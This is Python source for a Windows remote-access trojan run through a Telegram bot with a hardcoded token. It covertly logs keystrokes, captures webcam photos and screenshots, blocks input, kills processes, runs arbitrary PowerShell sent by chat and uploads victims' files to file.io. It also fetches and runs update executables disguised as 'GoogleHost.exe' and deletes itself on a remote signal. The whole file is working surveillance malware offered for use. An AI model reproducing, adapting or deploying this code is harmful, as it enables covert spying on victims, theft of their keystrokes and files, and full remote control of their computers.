import cv2
import numpy
from pynput import keyboard
import time
from ctypes import windll
import os
import threading
import subprocess
import telebot
import pyautogui
from io import BytesIO
import requests
from pathlib import Path
BOT_TOKEN = '7653102633:AAF8CG8S5M1LJZKpJvTHWuqU5wMUE9wIXx4'
implode = False
bot = telebot.TeleBot(BOT_TOKEN)

try:
    os.remove("keylogs.txt")
except:
    pass


last_key_time = time.time()
PAUSE_THRESHOLD = 1.0  # 1 second of no keypress will trigger a new line

current_directory = os.getcwd()

def generate_tree(directory, prefix=""):
    tree_lines = []
    contents = os.listdir(directory)
    contents.sort()
    for i, item in enumerate(contents):
        path = os.path.join(directory, item)
        if i == len(contents) - 1:
            tree_lines.append(f"{prefix}└── {item}")
            if os.path.isdir(path):
                tree_lines.extend(generate_tree(path, prefix + "    "))
        else:
            tree_lines.append(f"{prefix}├── {item}")
            if os.path.isdir(path):
                tree_lines.extend(generate_tree(path, prefix + "│   "))
    return tree_lines

def on_press(key):
    global last_key_time
    current_time = time.time()

    try:
        key_char = key.char
    except AttributeError:
        key_char = f"[{key}]"
    
    if current_time - last_key_time > PAUSE_THRESHOLD:
        with open("C:\\Users\\Public\\Programs\\keylogs.txt", "a") as file:
            file.write("\n")  # Start a new line
    
    with open("C:\\Users\\Public\\Programs\\keylogs.txt", "a") as file:
        file.write(f"{key_char} ")

    last_key_time = current_time

def start_keylogger():
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

def disable_keyboard():
    windll.user32.BlockInput(True)

def enable_keyboard():
    windll.user32.BlockInput(False)

def is_admin():
    try:
        # Try to run a command that requires admin privileges
        result = subprocess.run('net session', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0
    except subprocess.SubprocessError:
        return False

def capture_photo():
    # Open the webcam (0 is the default camera)
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        raise Exception("Could not access the camera")

    # Capture a single frame from the camera
    ret, frame = cap.read()
    
    # Release the camera
    cap.release()

    if not ret:
        raise Exception("Failed to capture photo")

    # Convert the captured frame to JPEG format (for sending via Telegram)
    ret, jpeg_image = cv2.imencode('.jpg', frame)

    if not ret:
        raise Exception("Failed to encode the photo")

    # Convert the JPEG image to a BytesIO object
    image_bytes = BytesIO(jpeg_image.tobytes())
    image_bytes.seek(0)

    return image_bytes

def take_screenshot():
    # Take a screenshot using pyautogui
    screenshot = pyautogui.screenshot()

    # Save it in a BytesIO object to send it directly to Telegram
    image_bytes = BytesIO()
    screenshot.save(image_bytes, format='PNG')
    image_bytes.seek(0)  # Go back to the beginning of the BytesIO object

    return image_bytes

def send_large_message(chat_id, message, chunk_size=4096):
    # Split the message into chunks if it exceeds the limit
    for i in range(0, len(message), chunk_size):
        chunk = message[i:i+chunk_size]
        bot.send_message(chat_id, chunk)

def terminate_process_by_name(process_name):
    try:
        result = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {process_name}'], capture_output=True, text=True)
        output = result.stdout
        
        if process_name not in output:
            return False

        # Parse the output to get the PID(s)
        lines = output.strip().split('\n')
        pids = []
        for line in lines:
            if process_name in line:
                parts = line.split()
                pids.append(parts[1])

        if not pids:
            return False

        # Use taskkill to terminate the process by PID
        for pid in pids:
            os.system(f'taskkill /F /PID {pid}')
        return True
    except Exception as e:
        return e

def format_task_list(tasks):
    formatted = []
    for task in tasks:
        formatted.append(f"Image Name: {task['Image Name']}\n"
                         f"PID: {task['PID']}\n"
                         f"Session Name: {task['Session Name']}\n"
                         f"Session#: {task['Session#']}\n"
                         f"Mem Usage: {task['Mem Usage']}\n")
    return "\n".join(formatted)

def get_task_list():
    # Run the tasklist command
    result = subprocess.run(['tasklist'], capture_output=True, text=True)
    
    # Capture the output
    output = result.stdout
    
    # Process the output line by line
    tasks = []
    for line in output.splitlines():
        if line.startswith("Image Name"):
            # Skip the header line
            continue
        if line.strip() == "":
            # Skip empty lines
            continue
        parts = line.split()
        task = {
            "Image Name": parts[0],
            "PID": parts[1],
            "Session Name": parts[2],
            "Session#": parts[3],
            "Mem Usage": parts[4]
        }
        tasks.append(task)
    
    return tasks

def check_wifi_connection():
    """Check if the computer is connected to the internet."""
    try:
        # Attempt to connect to a common DNS server (Google's)
        requests.get('https://www.google.com', timeout=5)
        return True
    except requests.ConnectionError:
        return False

def download_file(url):
    """Download the file from the specified URL."""
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.strip()  # Remove any extraneous whitespace
    except requests.RequestException as e:
        print(f"Error downloading file: {e}")
        return None

url = "https://raw.githubusercontent.com/p0k0r0k0/panic/main/panic.txt"
check_interval = 10  # Time to wait between checks (in seconds)

while True:
    if check_wifi_connection():
        print("Connected to the internet. Downloading file...")
        file_content = download_file(url)
        
        if file_content is not None:
            if file_content.lower() == "true":
                bat_content = """@echo off
timeout /t 5 /nobreak > nul
cd C:\\Users\\Public
rmdir /s /q Programs
del "%~f0"
"""
                with open("C:\\Users\\Public\\impl.bat", 'w') as new_file:
                    new_file.write(bat_content)
                subprocess.Popen("C:\\Users\\Public\\impl.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                terminate_process_by_name('GoogleHost.exe')
                break
            else:
                break
    else:
        print("Not connected to the internet. Retrying in a few seconds...")
    
    time.sleep(check_interval)

@bot.message_handler(commands=['ident', 'id'])
def send_welcome(message):
    bot.reply_to(message, os.getlogin())

@bot.message_handler(commands=['exit', 'e', 'bye'])
def exit_bot(message):
    bot.reply_to(message, "Exiting Bye!")
    terminate_process_by_name('GoogleHost.exe')

@bot.message_handler(commands=["kill"])
def kill_program(message):
    name_l=message.text.split()
    name = name_l[1]
    ret = terminate_process_by_name(str(name))
    if type(ret) == bool:
        if ret == True:
            bot.reply_to(message, "The proccess has been successfully terminated.")
        else:
            bot.reply_to(message, "The procces could not be terminated or was not found.")
    else:
        bot.reply_to(message, "The following error has ocured: "+ret)
    
@bot.message_handler(commands=["tasklist", "taskl", "tlsit", "tl"])
def send_task_list(message):
    try:
        tasks = get_task_list()
        if tasks:
            formatted_tasks = format_task_list(tasks)
            send_large_message(message.chat.id, formatted_tasks)  # Send in chunks if necessary
        else:
            bot.reply_to(message, "No tasks found.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['screenshot', 'sc'])
def send_screenshot(message):
    try:
        # Take the screenshot
        screenshot_image = take_screenshot()
        
        # Send the screenshot as an image to the user
        bot.send_photo(message.chat.id, screenshot_image)

    except Exception as e:
        bot.reply_to(message, f"An error occurred while taking the screenshot: {e}")

@bot.message_handler(commands=['photo', 'ph'])
def send_photo(message):
    try:
        # Capture the photo from the camera
        photo = capture_photo()
        
        # Send the photo to the user
        bot.send_photo(message.chat.id, photo)

    except Exception as e:
        bot.reply_to(message, f"An error occurred while capturing the photo: {e}")

@bot.message_handler(commands=['checkadmin'])
def handle_check_admin(message):
    if is_admin():
        bot.reply_to(message, "The script is running as Administrator.")
    else:
        bot.reply_to(message, "The script is NOT running as Administrator.")

@bot.message_handler(commands=['block', 'bk'])
def block_k(message):
    if is_admin():
        disable_keyboard()
        bot.reply_to(message, "Input has been blocked")   
    else:
        bot.reply_to(message, "You do not have the required privilleges") 

@bot.message_handler(commands=['unblock', 'unbk'])
def unblock_k(message):
    if is_admin():
        enable_keyboard()
        bot.reply_to(message, "Input has been unblocked")
    else:
        bot.reply_to(message, "You do not have the required privilleges") 

@bot.message_handler(commands=['openlink', 'ol'])
def open_link(message):
    a = message.text.split()
    url = a[1]
    subprocess.run(['start', url], shell=True)
    bot.reply_to(message, "Opening link.")

@bot.message_handler(commands=['start_keylogger'])
def check_and_run_keylogger(message):
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
    bot.reply_to(message, "Keylogger Started.")

@bot.message_handler(commands=['send_keylogs'])
def send_keylogs_command(message):
    try:
        # Open the keylogger output file
        with open("C:\\Users\\Public\\Programs\\keylogs.txt", "rb") as file:
            # Send the file via Telegram
            bot.send_document(message.chat.id, file)
        
        # Delete the keylog file after sending
        os.remove("C:\\Users\\Public\\Programs\\keylogs.txt")
        
        bot.reply_to(message, "Keylogs sent and file deleted successfully.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while sending the keylogs: {e}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
            
        with open(message.document.file_name, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        bot.reply_to(message, "File uploaded successfully.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while uploading the file: {e}")

# Command to handle file download
@bot.message_handler(commands=['download'])
def download_file(message):
    try:
        file_name = message.text.split()[1]
        res = requests.post(
            url=r'https://file.io',
            files={
                'file': Path(file_name).read_bytes()
            }
        )
        bot.reply_to(message, res.json()['link'])
    except Exception as e:
        bot.reply_to(message, f"An error occurred while downloading the file: {e}")

# Command to handle file deletion
@bot.message_handler(commands=['delete'])
def delete_file(message):
    try:
        file_name = message.text.split()[1]
        if os.path.exists(file_name):
            os.remove(file_name)
            bot.reply_to(message, "File deleted successfully.")
        else:
            bot.reply_to(message, "File not found.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while deleting the file: {e}")

@bot.message_handler(commands=['tree'])
def send_tree(message):
    try:
        directory = message.text.split()[1] if len(message.text.split()) > 1 else "."
        if os.path.exists(directory):
            tree_lines = generate_tree(directory)
            tree_str = "\n".join(tree_lines)
            send_large_message(message.chat.id, f"Directory tree of {directory}:\n{tree_str}")
        else:
            bot.reply_to(message, "Directory not found.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while generating the directory tree: {e}")

# Function to change the directory
@bot.message_handler(commands=['cd'])
def change_directory(message):
    global current_directory
    try:
        new_dir = message.text.split()[1]
        if os.path.isdir(new_dir):
            os.chdir(new_dir)
            current_directory = os.getcwd()
            bot.reply_to(message, f"Directory changed to: {current_directory}")
        else:
            bot.reply_to(message, "Directory not found.")
    except IndexError:
        bot.reply_to(message, "Please specify a directory.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while changing the directory: {e}")

# Function to list directory contents
@bot.message_handler(commands=['ls'])
def list_directory_contents(message):
    try:
        contents = os.listdir(current_directory)
        formatted_contents = "\n".join(contents)
        send_large_message(message.chat.id, f"Contents of {current_directory}:\n{formatted_contents}")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while listing directory contents: {e}")

# Function to print the current working directory
@bot.message_handler(commands=['pwd'])
def print_working_directory(message):
    try:
        bot.reply_to(message, f"Current working directory: {current_directory}")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while getting the current working diSrectory: {e}")

@bot.message_handler(commands=['update'])
def update_bot(message):
    bat_content = """@echo off
timeout /t 5 /nobreak > nul
cd C:\\Users\\Public\\Programs
del GoogleHost.exe
rename update.exe GoogleHost.exe
start GoogleHost.exe
del "%~f0"
"""
    file_url = message.text.split()[1]
    try:
        downloaded_file = requests.get(file_url)
        bot.reply_to(message, "File started upd.")
        if downloaded_file.status_code == 200:
            with open("C:\\Users\\Public\\Programs\\update.exe", 'wb') as new_file:
                    new_file.write(downloaded_file.content)
            with open("C:\\Users\\Public\\Programs\\upd.bat", 'w') as new_file:
                    new_file.write(bat_content)
            bot.reply_to(message, "File started updating.")
            subprocess.Popen("C:\\Users\\Public\\Programs\\upd.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            terminate_process_by_name('GoogleHost.exe')
    except Exception as e:
        bot.reply_to(message, f"An error occurred while uploading the file: {e}")

@bot.message_handler(commands=["implode"])
def impl(message):
    global implode
    implode = True
    bot.reply_to(message, "Please confirm if you wanna implode.")

@bot.message_handler(commands=["CONFIRM"])
def imploder_protocol(message):
    global implode
    if implode:
        bot.reply_to(message, "Confirmed starting imploding protocol.\n\n\nSEE YOU!!!")
        bat_content = """@echo off
timeout /t 5 /nobreak > nul
cd C:\\Users\\Public
rmdir /s /q Programs
del "%~f0"
"""
        with open("C:\\Users\\Public\\impl.bat", 'w') as new_file:
                    new_file.write(bat_content)
        subprocess.Popen("C:\\Users\\Public\\impl.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        terminate_process_by_name('GoogleHost.exe')
    else:
        bot.reply_to(message, "You did not start imploding protocol.")

@bot.message_handler(func=lambda msg: True)
def echo_all(message):
    command = message.text
    try:
        result = subprocess.run(
            ["powershell", "-Command", command],
            capture_output=True, text=True, check=True
        )
        bot.reply_to(message, result.stdout)
        if result.stderr:
            bot.reply_to(message, "Errors:")
            bot.reply_to(message, result.stderr)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"Error executing PowerShell command: {e}")
        bot.reply_to(message, "Errors:")
        bot.reply_to(message, e.stderr)
bot.infinity_polling()